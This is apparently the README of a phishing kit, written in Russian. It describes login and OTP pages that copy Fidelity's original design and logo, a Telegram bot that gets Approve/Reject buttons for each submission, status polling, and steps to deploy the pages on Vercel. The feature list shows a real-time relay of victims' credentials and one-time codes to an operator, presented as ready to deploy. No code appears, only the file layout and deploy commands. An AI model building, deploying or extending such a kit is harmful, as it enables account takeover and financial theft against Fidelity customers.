# Fidelity Vercel Project

## Полный проект с оригинальным дизайном и функционалом

### Структура:
- `index.php` - Форма логина с кнопками Approve/Reject в Telegram
- `otp.php` - Форма OTP с кнопками Approve/Reject в Telegram
- `config.php` - Настройки бота
- `vercel.json` - Конфигурация Vercel
- `assets/` - CSS и логотип Fidelity

### Деплой:
1. Скачайте все файлы
2. Установите Vercel CLI: `npm i -g vercel`
3. Запустите: `vercel --prod`

### Особенности:
- ✅ Полный оригинальный дизайн Fidelity
- ✅ Кнопки Approve/Reject в Telegram
- ✅ Polling статуса (проверка каждые 2 сек)
- ✅ Адаптировано для Vercel (сессии вместо файлов)
- ✅ Rate limiting
- ✅ CSRF защита